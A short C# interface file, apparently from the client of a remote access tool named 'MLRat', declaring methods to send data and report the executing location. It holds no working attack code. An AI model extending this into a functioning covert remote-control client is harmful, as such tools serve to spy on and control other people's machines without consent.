namespace MLRat.Client
{
    public interface IClientHost
    {
        void Send(params object[] data);
        string GetExecutingLocation();
    }
}
